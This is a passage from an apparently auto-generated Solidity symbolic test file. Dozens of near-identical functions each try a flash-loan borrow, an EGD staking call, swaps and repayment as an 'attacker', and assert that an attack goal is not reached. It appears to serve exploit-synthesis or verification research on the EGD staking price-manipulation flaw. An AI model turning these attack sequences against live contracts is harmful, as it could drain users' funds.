        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
